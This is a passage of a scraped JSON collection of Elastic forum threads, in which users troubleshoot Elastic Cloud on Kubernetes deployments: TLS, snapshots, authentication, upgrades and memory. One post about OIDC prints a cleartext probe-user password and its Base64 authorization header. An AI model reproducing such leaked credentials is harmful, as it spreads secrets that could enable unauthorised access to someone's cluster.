    "author": "ismailbaskin",
    "date": "June 5, 2019, 3:20pm June 5, 2019, 3:34pm July 25, 2019, 7:04am November 2, 2019, 5:37pm",
    "body": "Hi, I'm not sure but it seems ECK operator is strictly depends on xpack features. Is there any way to use it open source version of ElasticSearch with ECK operator?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "05a40ff1-1497-4958-bbcf-0a1f1317351f",
    "url": "https://discuss.elastic.co/t/eck-istio-mtls/205070",
    "title": "ECK + Istio mTLS",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Spencer_Gilbert",
    "date": "October 24, 2019, 12:54pm October 24, 2019, 2:55pm October 24, 2019, 4:38pm October 25, 2019, 12:49pm October 25, 2019, 1:36pm October 28, 2019, 3:58pm October 28, 2019, 2:49pm November 1, 2019, 11:01am",
    "body": "I saw on the release notes a mention of using ECK with Istio with disabling HTTP level TLS - I've been trying to use mTLS with Istio and ES and running into problems both with the transport layer (which I think I've resolved by using network.bind_host = 127.0.0.1) and the ECK managed Kibana which seems to fail to communicate with the ES cluster when mTLS is enabled. Is this supported, and if so is there any guidance on making this work? Thanks!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "e30b2f38-9ddd-4744-b462-e99df900f165",
    "url": "https://discuss.elastic.co/t/upgrade-of-custom-image-statefulset-causes-cluster-wide-readiness-probe-failed/205952",
    "title": "Upgrade of custom-image statefulset causes cluster-wide Readiness probe failed",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "October 30, 2019, 9:57pm October 30, 2019, 10:10pm October 31, 2019, 9:31am October 31, 2019, 5:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4853ecbc-fd7a-4086-a3e3-5f37855f96c4",
    "url": "https://discuss.elastic.co/t/if-physical-mechine-down-how-to-move-the-bad-pod-to-other-working-node-when-using-local-volume-storageclass/205718",
    "title": "If physical mechine down, how to move the bad pod to other working node when using local-volume storageclass",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LoadingZhang",
    "date": "October 29, 2019, 4:55pm October 30, 2019, 7:07am October 30, 2019, 8:42am",
    "body": "I’m using elastic-local-volume as storageclass. I shutdown a physical mechine to simulate hardware malfunction. I found the pod can not move to other node because of volume node affinity. Could we move it to other node manually? Or operator can move it automatically few minutes later?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c5126214-3880-4d7f-ab3e-5324d41c7529",
    "url": "https://discuss.elastic.co/t/authentication-to-realm-default-file-failed/205237",
    "title": "Authentication to realm default_file failed",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pabloborh",
    "date": "October 25, 2019, 10:38am October 28, 2019, 6:11am October 28, 2019, 12:31pm October 28, 2019, 12:31pm",
    "body": "Hi! I have a elasticsearch cluster deployed with ECK. The pods are logging: level\": \"WARN\", \"component\": \"o.e.x.s.a.AuthenticationService\", \"cluster.name\": \"elasticsearch\", \"node.name\": \"elasticsearch-es-data-6ff4cgt49v\", \"message\": \"Authentication to realm default_file failed - Password authentication failed for elastic\", \"cluster.uuid\": \"ixv-beimTw-glVn8x3-TEA\", \"node.id\": \"guIZqSwRSUm7zU1ZHCu8iw\" } I don't understand de error. Cluster is working (3 master, 3 ingest, 3 data). Also i have other question. it's possible preserve data volumes from data nodes? I had troubles and I had lost all data. Luckily i had a snapshot of the most important index.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b55c68ed-020f-4251-8ee9-d47995c418c3",
    "url": "https://discuss.elastic.co/t/maximum-number-of-data-disk-exceeded/204883",
    "title": "Maximum number of data disk exceeded",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Alwandy",
    "date": "October 23, 2019, 1:43pm October 28, 2019, 6:15am",
    "body": "Hey guys, For my initial creation of K8s, I have already assigned 4 data disks (this is our QA env) during the creation process. When running the template to create the master node to act as ingress and data. I hit on an error: Failure sending request: StatusCode=0 -- Original Error: autorest/azure: Service returned an error. Status= Code=\"OperationNotAllowed\" Message=\"The maximum number of data disks allowed to be attached to a VM of this size is 4.\" Target=\"dataDisks\" How can we through CRD / Master template I created to use the existing disk(s)?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4767526d-dc52-40b4-b33b-d21286622b53",
    "url": "https://discuss.elastic.co/t/automating-es-installation-with-eck-via-helm/205335",
    "title": "Automating ES installation with ECK via Helm",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Aravind",
    "date": "October 25, 2019, 11:24pm October 28, 2019, 5:51am",
    "body": "I would like to automate the installation of Elasticsearch via ECK on a cloud provider via helm. I don't want to prematurely go and install the custom kubernetes resource of kind: Elasticsearch before the operator is fully initialized and running. So my question is what guarantees ECK is fully up and running ? Asking this so that I could test for that before proceeding to install Elasticsearch Appreciate any response.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e501c00b-0c86-43c7-adf1-33abe1e9898f",
    "url": "https://discuss.elastic.co/t/installing-es-with-custom-image-from-private-repository-fails/205331",
    "title": "Installing ES with Custom image from private repository fails",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Aravind",
    "date": "October 25, 2019, 10:10pm October 25, 2019, 10:11pm October 25, 2019, 10:44pm October 28, 2019, 5:44am",
    "body": "Here is my file - apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: jaeger-elasticsearch namespace: test spec: image: phx.ocir.io/<>/elasticsearch/elasticsearch:7.3.2 version: 7.3.2 nodes: - nodeCount: 1 config: node.master: true node.data: true node.ingest: true I've verified that the image exists and does not require secrets for pull. After installation I see this - NAME HEALTH NODES VERSION PHASE AGE jaeger-elasticsearch 7.3.2 Invalid 6m Can someone pls help ? How do I debug/get logs as to what's going on ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3513270b-df6a-4cb1-a495-0e5a5d62de4a",
    "url": "https://discuss.elastic.co/t/change-version-and-custom-images-in-eck/205306",
    "title": "Change version and custom images in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LoadingZhang",
    "date": "October 25, 2019, 5:26pm October 28, 2019, 5:41am",
    "body": "Now I set configuration as below: spec: version: 7.4.0 image: my_custom_image:7.4.0 What would happen if I change version to 7.4.1 but image not? And what would happen if change image tag to 7.4.1 but version not?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cd99d4dc-4677-4e20-a757-9a368c186fe4",
    "url": "https://discuss.elastic.co/t/setup-snapshots-with-minio-unable-to-retrieve-secrets/202351",
    "title": "Setup snapshots with minio, unable to retrieve secrets",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Kent_Brake",
    "date": "October 4, 2019, 1:42pm October 10, 2019, 11:11am October 24, 2019, 8:44pm",
    "body": "Hi, I'm trying to setup snapshot with a local minion instance, but I can't seem to imports secrets as documented here. I setup the secrets with: kubectl create secret generic minio-credentials --from-file=s3.client.default.access_key --from-file=s3.client.default.secret_key Then added it to the elasticsearch yaml file: secureSettings: secretName: \"minio-credentials\" I can see in the operator logs that its picked up: {\"level\":\"info\",\"ts\":1570195646.0524664,\"logger\":\"license-validation\",\"msg\":\"ValidationHandler handler called\",\"operation\":\"CREATE\",\"name\":\"**minio-credentials**\",\"namespace\":\"default\"} {\"level\":\"info\",\"ts\":1570195684.2096705,\"logger\":\"es-validation\",\"msg\":\"ValidationHandler handler called\",\"operation\":\"UPDATE\",\"name\":\"quickstart\",\"namespace\":\"default\"} But when I setup via console PUT /_snapshot/my_minio_repository { \"type\": \"s3\", \"settings\": { \"bucket\": \"esbackups\", \"endpoint\": \"10.1.1.220:9000\", \"protocol\": \"http\" } } I get this error: { \"error\": { \"root_cause\": [ { \"type\": \"repository_verification_exception\", \"reason\": \"[my_minio_repository] path is not accessible on master node\" } ], \"type\": \"repository_verification_exception\", \"reason\": \"[my_minio_repository] path is not accessible on master node\", \"caused_by\": { \"type\": \"i_o_exception\", \"reason\": \"Unable to upload object [tests-86_qgPYEQ3KdDtlhf6kK2g/master.dat] using a single upload\", \"caused_by\": { \"type\": \"sdk_client_exception\", \"reason\": \"sdk_client_exception: Unable to load credentials from service endpoint\", \"caused_by\": { \"type\": \"i_o_exception\", \"reason\": \"Connect timed out\" } } } }, \"status\": 500 }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "81ad7ba5-748e-45e0-9ae9-3477525d30f7",
    "url": "https://discuss.elastic.co/t/quickstart-example-v0-8-ssl-error/183992",
    "title": "Quickstart Example (v0.8) SSL error",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "MooseyMersa",
    "date": "June 3, 2019, 2:32pm June 4, 2019, 1:26pm June 4, 2019, 10:48am June 4, 2019, 11:26am June 4, 2019, 12:58pm October 21, 2019, 9:30am October 21, 2019, 11:03am October 22, 2019, 8:48am",
    "body": "Hi, I've followed the guide https://www.elastic.co/guide/en/cloud-on-k8s/current/index.html and deployed the items described, everything seems to have been correctly created. However when the Elasticsearch logs are inspected there is a problem connecting to it which looks like it relates to an SSL certificate. Any advice on how to resolve this? The relevant extract from the Elasticsearch log is as follows: {\"type\": \"server\", \"timestamp\": \"2019-06-03T14:25:47,157+0000\", \"level\": \"WARN\", \"component\": \"o.e.h.AbstractHttpServerTransport\", \"cluster.name\": \"quickstart\", \"node.name\": \"quickstart-es-p27jq468fh\", \"cluster.uuid\": \"zu07afsqR4Su51dScM6MYw\", \"node.id\": \"vmGa6_pnRaqjagdW3v4GeA\", \"message\": \"caught exception while handling client http traffic, closing connection Netty4HttpChannel{localAddress=0.0.0.0/0.0.0.0:9200, remoteAddress=/10.244.0.100:45094}\" , \"stacktrace\": [\"io.netty.handler.codec.DecoderException: javax.net.ssl.SSLHandshakeException: Received fatal alert: bad_certificate\" The filebeat log is shown below: 2019-06-03T14:27:28.643Z INFO [monitoring] log/log.go:144 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":30310,\"time\":{\"ms\":6}},\"total\":{\"ticks\":153690,\"time\":{\"ms\":47},\"value\":153690},\"user\":{\"ticks\":123380,\"time\":{\"ms\":41}}},\"handles\":{\"limit\":{\"hard\":1048576,\"soft\":1048576},\"open\":16},\"info\":{\"ephemeral_id\":\"bbd1dd2f-d815-4003-829b-182cc3d8ce3f\",\"uptime\":{\"ms\":268890029}},\"memstats\":{\"gc_next\":46221424,\"memory_alloc\":23183016,\"memory_total\":3499909608}},\"filebeat\":{\"harvester\":{\"open_files\":9,\"running\":21}},\"libbeat\":{\"config\":{\"module\":{\"running\":0}},\"pipeline\":{\"clients\":2,\"events\":{\"active\":4117,\"retry\":50}}},\"registrar\":{\"states\":{\"current\":26}},\"system\":{\"load\":{\"1\":0.23,\"15\":0.03,\"5\":0.07,\"norm\":{\"1\":0.115,\"15\":0.015,\"5\":0.035}}}}}} 2019-06-03T14:27:58.037Z ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://quickstart-es.default.svc.cluster.local:9200)): Get https://quickstart-es.default.svc.cluster.local:9200: x509: certificate signed by unknown authority 2019-06-03T14:27:58.037Z INFO pipeline/output.go:93 Attempting to reconnect to backoff(elasticsearch(https://quickstart-es.default.svc.cluster.local:9200)) with 5947 reconnect attempt(s)",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "906d9876-f2ac-4f01-951d-f21bdec40866",
    "url": "https://discuss.elastic.co/t/how-to-create-role-mapping-file/199459",
    "title": "How to create role mapping file",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sfgroups1",
    "date": "September 13, 2019, 3:39pm September 30, 2019, 12:07pm October 8, 2019, 5:16pm October 18, 2019, 8:40am",
    "body": "Hi, I am adding the LDAP authentication to my cluster, I need to create the group_to_role_mapping.yml file for the roles. Is there an example I can follow? files: role_mapping: \"/mnt/elasticsearch/group_to_role_mapping.yml\" unmapped_groups_as_roles: false Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "212ac1e3-937e-46c4-9f3a-5a647fcc3af1",
    "url": "https://discuss.elastic.co/t/eck-install-kubernetes-on-premise-k8s-cluster-with-local-nfs/204065",
    "title": "ECK install kubernetes on-premise k8s cluster with local NFS",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "umim9",
    "date": "October 17, 2019, 1:19pm October 17, 2019, 3:01pm",
    "body": "Hi, I want install one ECK cluster in local on-premise k8s HA cluster. I use local network NFS share persistent store for k8s HA cluster. I am a beginner enginer. Someone can send install yaml file for me? Thank you, bye. Steven",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "be1493f4-6e78-476b-82ac-2f3b7dc2b834",
    "url": "https://discuss.elastic.co/t/using-s3-repository-with-ec2-instance-profile-and-kube2iam/203252",
    "title": "Using s3-repository with EC2 Instance Profile and kube2iam",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "akappler",
    "date": "October 11, 2019, 2:46pm October 14, 2019, 10:29pm October 16, 2019, 11:11am October 16, 2019, 3:28pm",
    "body": "I am trying to configure my Elasticsearch instance for access to a S3 bucket. I want to secure access via an AWS Role, which should be assumed automatically via kube2iam. I am running into two problems: For kube2iam to work, it is necessary to add an annotation to the Elasticsearch Pod. I tried via the \"podTemplate\", but this did not work. Is there any way to do this or do you plan to add support? If I add the annotation for kube2iam manually to the Pod, I can exec into the container and verify that the AWS Role is assigned correctly. I can access to S3 bucket via aws cli. However when I try to create the repository, it fails with the following error message: curl -H \"Content-Type: application/json\" -X PUT --user elastic:XXX -k https://localhost:8000/_snapshot/s3 --data '{\"type\":\"s3\", \"settings\": {\"endpoint\": \"s3.eu-central-1.amazonaws.com\", \"bucket\":\"backup\", \"server_side_encryption\": true}}' {\"error\":{\"root_cause\":[{\"type\":\"repository_verification_exception\",\"reason\":\"[s3] path is not accessible on master node\"}],\"type\":\"repository_verification_exception\",\"reason\":\"[s3] path is not accessible on master node\",\"caused_by\":{\"type\":\"i_o_exception\",\"reason\":\"Unable to upload object [tests-hOTEv96NS1yoA4mgpNgzxg/master.dat] using a single upload\",\"caused_by\":{\"type\":\"amazon_s3_exception\",\"reason\":\"Access Denied (Service: Amazon S3; Status Code: 403; Error Code: AccessDenied; Request ID: XXX; S3 Extended Request ID: XXX\"}}},\"status\":500}",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ba2e6a4b-4766-4997-8e68-5e2cde422577",
    "url": "https://discuss.elastic.co/t/runaway-memory-usage/203483",
    "title": "Runaway memory usage",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JoeyLemur",
    "date": "October 14, 2019, 3:30pm October 14, 2019, 3:59pm October 14, 2019, 4:17pm October 14, 2019, 6:15pm October 14, 2019, 7:11pm",
    "body": "I am deploying Elastic 7.4.0 in my cluster, specifying -Xms4096M -Xmx4096M for the nodes, but I continue to run into pods getting evicted for memory pressure. Examples: The node was low on resource: memory. Container elasticsearch was using 36874144Ki, which exceeds its request of 8Gi. The node was low on resource: memory. Container elasticsearch was using 49884448Ki, which exceeds its request of 8Gi. The top output from one of the nodes shows this rather impressive virtual address space usage: PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 63500 1000 20 0 97.810g 4.584g 170780 S 46.0 8.3 912:46.37 java Anyone know why java is bloating so badly, and what I can do to stop it?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6dd71077-47ca-4a6d-9cae-39afd89a7363",
    "url": "https://discuss.elastic.co/t/stuck-upgrade/203087",
    "title": "Stuck upgrade",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Claus_Strommer",
    "date": "October 10, 2019, 6:19pm October 11, 2019, 5:55am",
    "body": "I 've used eck to set up an elasticsearch cluster at v7.2.0. I've successfully upgraded it to 7.3.0 and 7.3.1. However, when I attempted to upgrade it to 7.4.0 the change to the CRD was accepted but the operator did not upgrade the pods. Now the operator won't let me downgrade the CRD to match the pods, and it won't upgrade the pods because it thinks they're already at v7.4.0. Deleting a pod will only recreate it with the same version it's already at. I'd like to either rectify the operator's data to match the cluster state, or manually update the pods to match the CRD, and am looking for recommendations.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a54112d3-8964-4b8f-93b1-2a530747475e",
    "url": "https://discuss.elastic.co/t/elastic-operator-juju-charm/203117",
    "title": "Elastic Operator Juju Charm",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "jamesbeedy",
    "date": "October 10, 2019, 10:00pm",
    "body": "Hello, I want to introduce the lifecycle ops we are building around ECK using Juju charms. elastic-operator charm home page discourse post explaining the elastic-operator charm and modeling custom objects via Juju layer-elastic-operator-k8s github My team and I will be working on modeling the Elasticsearch, Kibana and ApmServer objects in Juju over the coming weeks. In the mean time, we welcome and appreciate any feedback on how we are encapsulating the elastic-operator as a Juju charm. Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9c011036-c344-46e2-b14a-5ff587dac6ea",
    "url": "https://discuss.elastic.co/t/gcs-repository-creation-issue-for-elasticsearch-on-gke/201519",
    "title": "Gcs-repository-creation-issue for elasticsearch on gke",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Kumar_Saurabh_Srivas",
    "date": "September 30, 2019, 5:53pm September 29, 2019, 6:55am September 30, 2019, 2:59am September 30, 2019, 6:51am September 30, 2019, 8:31am September 30, 2019, 11:17am September 30, 2019, 2:09pm September 30, 2019, 2:26pm September 30, 2019, 3:14pm September 30, 2019, 5:42pm September 30, 2019, 5:54pm September 30, 2019, 6:10pm October 1, 2019, 4:14am October 29, 2019, 4:14am",
    "body": "We are setting up an elasticsearch cluster on GKE with the following format: Master nodes as kubernetes deployments Client nodes as kubernetes deployments with HPA Data nodes as stateful sets with PVs We are able to set up the cluster well. But then we are struggling in configuring the snapshot backup mechanism. Essentially, we are following this guide. We are able to follow this upto the step of getting the secret json key. Afterwards, we are not sure how to add this to the elasticsearch keystore and proceed further. We are really stuck on this for quite some and the documentation have not been great. All docs mention that add this json key to elasticsearch.keystore but we don't know how to do that. The json file is on our local shell while the keystore is on es pods. Also, we have created a custom dockerfile to install gcs plugin. Really looking for some help here.",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "b64e66a8-17ee-46ba-932e-0b9ce9c571da",
    "url": "https://discuss.elastic.co/t/upgrading-elasticsearch-version-on-eck/201222",
    "title": "Upgrading elasticsearch version on ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Bozo_Tegeltija",
    "date": "September 26, 2019, 12:07pm September 26, 2019, 12:58pm",
    "body": "How should I approach upgrading the version of Elasticsearch? Can operator handle just changing the configuration from version: 7.2.0 -> 7.3.0 and kubectl apply?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dbc9c2ea-1bd9-4f59-a5ce-9a185092120b",
    "url": "https://discuss.elastic.co/t/how-to-override-configuration-in-runtime/200688",
    "title": "How to override configuration in runtime",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Bozo_Tegeltija",
    "date": "September 23, 2019, 12:07pm September 23, 2019, 2:22pm September 26, 2019, 7:33am September 26, 2019, 7:49am",
    "body": "How can you use the predefined configuration(elasticsearch.yml) and override just one field (e.g. xpack.security.secureCookies=false?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "20f9b85c-1fe5-4276-868a-2491cc479e57",
    "url": "https://discuss.elastic.co/t/whats-the-default-registry-and-images-for-eck-and-es/201083",
    "title": "What's the default registry and images for ECK and ES",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "gearoidibm",
    "date": "September 25, 2019, 4:15pm September 25, 2019, 4:47pm September 25, 2019, 7:45pm",
    "body": "What's the default registry and images used for both the operator and ES itself. Where can I find the Dockerfiles for the ES images ? I've skimmed the operator repo but not sure where I'd find these in the code.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d12d3264-a44e-428c-86f0-4de34fa3b36d",
    "url": "https://discuss.elastic.co/t/is-there-a-target-release-date-for-1-0/200704",
    "title": "Is there a target release date for 1.0?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "gearoidibm",
    "date": "September 23, 2019, 2:12pm September 23, 2019, 4:47pm September 24, 2019, 10:06am",
    "body": "Is there a target date for release of 1.0 or any indicative timeframe ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4aaa83d9-bc15-4119-92b3-28b234d99bfc",
    "url": "https://discuss.elastic.co/t/readiness-check-failure-when-enabling-oidc-authentication/200554",
    "title": "Readiness check failure when enabling OIDC authentication",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "robcoward",
    "date": "September 22, 2019, 12:52am September 22, 2019, 8:14am September 22, 2019, 6:16pm",
    "body": "I'm trying to enable OIDC authentication in elastic/kibana deployed by the operator, having enabled the platinum subscription trial. The operator is starting the required number of pods and they are coming up as running but not ready. Checking the pod description to find what the readiness check is defined as and exec'ing into the container, I can see that elasticsearch is running and responds to curl on port 9200, however the PROBE_USERNAME and password in the PROBE_PASSWORD_FILE is failing to authenticate: sh-4.2# curl -vk -u elastic-internal-probe:hmmnr8rchqfp8dm9w4fs87cq https://127.0.0.1:9200 * About to connect() to 127.0.0.1 port 9200 (#0) * Trying 127.0.0.1... * Connected to 127.0.0.1 (127.0.0.1) port 9200 (#0) * Initializing NSS with certpath: sql:/etc/pki/nssdb * skipping SSL peer certificate verification * SSL connection using TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 * Server certificate: * subject: CN=edp-mgt-elasticsearch-es-http.monitoring.es.local,OU=edp-mgt-elasticsearch * start date: Sep 19 20:31:52 2019 GMT * expire date: Sep 18 20:41:52 2020 GMT * common name: edp-mgt-elasticsearch-es-http.monitoring.es.local * issuer: CN=edp-mgt-elasticsearch-http,OU=edp-mgt-elasticsearch * Server auth using Basic with user 'elastic-internal-probe' > GET / HTTP/1.1 > Authorization: Basic ZWxhc3RpYy1pbnRlcm5hbC1wcm9iZTpobW1ucjhyY2hxZnA4ZG05dzRmczg3Y3E= > User-Agent: curl/7.29.0 > Host: 127.0.0.1:9200 > Accept: */* > < HTTP/1.1 401 Unauthorized < WWW-Authenticate: Bearer realm=\"security\" < WWW-Authenticate: ApiKey * Authentication problem. Ignoring this. < WWW-Authenticate: Basic realm=\"security\" charset=\"UTF-8\" < content-type: application/json; charset=UTF-8 < content-length: 495 < * Connection #0 to host 127.0.0.1 left intact {\"error\":{\"root_cause\":[{\"type\":\"security_exception\",\"reason\":\"unable to authenticate user [elastic-internal-probe] for REST request [/]\",\"header\":{\"WWW-Authenticate\":[\"Bearer realm=\\\"security\\\"\",\"ApiKey\",\"Basic realm=\\\"security\\\" charset=\\\"UTF-8\\\"\"]}}],\"type\":\"security_exception\",\"reason\":\"unable to authenticate user [elastic-internal-probe] for REST request [/]\",\"header\":{\"WWW-Authenticate\":[\"Bearer realm=\\\"security\\\"\",\"ApiKey\",\"Basic realm=\\\"security\\\" charset=\\\"UTF-8\\\"\"]}},\"status\":401} Does anyone have any suggestions on what I can check next ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0a192c44-1442-4392-ba2a-3cd7b4351ac4",
    "url": "https://discuss.elastic.co/t/unknown-secure-setting-secure-bind-password-please-check-that-any-required-plugins-are-installed/199329",
    "title": "Unknown secure setting [secure_bind_password] please check that any required plugins are installed",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sfgroups1",
    "date": "September 12, 2019, 10:00pm September 13, 2019, 10:59am September 13, 2019, 1:54pm",
    "body": "Hi, when I deploy below in my kubernetes cluster 1.15.3. POD is failing with secure setting error message. How to fix this error? apiVersion: v1 kind: Secret metadata: name: secure-bind-password type: Opaque data: xpack.security.authc.realms.ldap.ldap1.secure_bind_password: XXXXXXaW4= --- apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.2.0 secureSettings: secretName: secure-bind-password image: docker.elastic.co/elasticsearch/elasticsearch:7.3.1 nodes: - nodeCount: 1 config: node.master: true node.data: true node.ingest: true xpack.security.authc.realms: &xpack-realms # explicitly enable file and native realm, otherwise it's disabled implicitly when other realms are used. file.file1: { order: 0 } native.native1: { order: 1 } ldap.ldap1: order: 2 url: \"ldap://example:389\" bind_dn: \"\" secure_bind_password: xpack.security.authc.realms.ldap.ldap1.secure_bind_password --- error messae \"stacktrace\": [\"org.elasticsearch.bootstrap.StartupException: java.lang.IllegalArgumentException: unknown secure setting [secure_bind_password] please check that any required plugins are installed, or check the breaking changes documentation for removed settings\", \"at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:163) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:124) ~[elasticsearch-cli-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-cli-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:115) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:92) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"Caused by: java.lang.IllegalArgumentException: unknown secure setting [secure_bind_password] please check that any required plugins are installed, or check the breaking changes documentation for removed settings\", \"at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:531) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:476) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:447) ~[elasticsearch-7.3.1.jar:7.3.1]\", \"at org.elasticsearch.common.settings.AbstractScopedSettings.validate(AbstractScopedSettings.java:418) ~[elasticsearch-7.3.1.jar:7.3.1]\",",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a0f23356-2126-4bdd-a7b1-55a21510b968",
    "url": "https://discuss.elastic.co/t/cant-connect-from-fluentd-notsslrecordexception-error/199221",
    "title": "Can't connect from fluentd: NotSslRecordException error",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Paul_F",
    "date": "September 12, 2019, 9:49am September 12, 2019, 12:32pm September 13, 2019, 1:48pm",
    "body": "I have deployed Elastic stack on k8s [running with kops on AWS] with almost default configuration [just different namespace]. I have deployed a fluentd daemonset in the same namespace and I am trying to connect to Elastic, but from fluentd I am getting: [warn]: #0 [out_es] Could not communicate to Elasticsearch, resetting connection and trying again. end of file reached (EOFError) And from elastic instance I am getting: Caused by: io.netty.handler.ssl.NotSslRecordException: not an SSL/TLS record What am I missing in my configuration? How can I make it work? My fluentd config is fairly default: <match **> @type elasticsearch @id out_es @log_level \"info\" include_tag_key true host \"elastic-es-http.elastic-system.svc.cluster.local\" port 9200 path \"\" scheme http ssl_verify true ssl_version TLSv1 reload_connections false reconnect_on_error true reload_on_failure true log_es_400_reason false logstash_prefix \"logstash\" logstash_format true index_name \"logstash\" type_name \"fluentd\"",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "993d57b8-9c61-458d-bb34-a7501dbeb413",
    "url": "https://discuss.elastic.co/t/quickstart-health-and-phase-are-empty/198164",
    "title": "Quickstart \"health\" and \"phase\" are empty",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "shirishatideal",
    "date": "September 5, 2019, 8:31am September 5, 2019, 9:06am September 6, 2019, 6:49am September 6, 2019, 7:22am September 6, 2019, 8:13am September 10, 2019, 7:29pm September 12, 2019, 2:20am September 12, 2019, 12:45pm September 12, 2019, 5:23pm",
    "body": "I am trying ECK but got stuck right at start, eck_install.png1509×219 14 KB $ kubectl get elasticsearch quickstart NAME HEALTH NODES VERSION PHASE AGE quickstart 7.2.0 24m Kubernetes - v1.15.3 Centos7 AWS Instance (t3.large) Operator logs show timeout as seems to be trying to pull non-existent GitHub resources github.com/elastic/cloud-on-k8s/operators/ I can't see \"operators\" in cloud-on-k8s. Any guidance on troubleshooting appreciated ! Shirish",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "cc5d9fb8-43e2-4629-9d6b-def15d5769cd",
    "url": "https://discuss.elastic.co/t/error-on-cluster-downsizing-if-the-master-node-is-stopped/195766",
    "title": "Error on cluster downsizing if the master node is stopped",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "gboanea",
    "date": "August 19, 2019, 3:29pm September 12, 2019, 12:51pm",
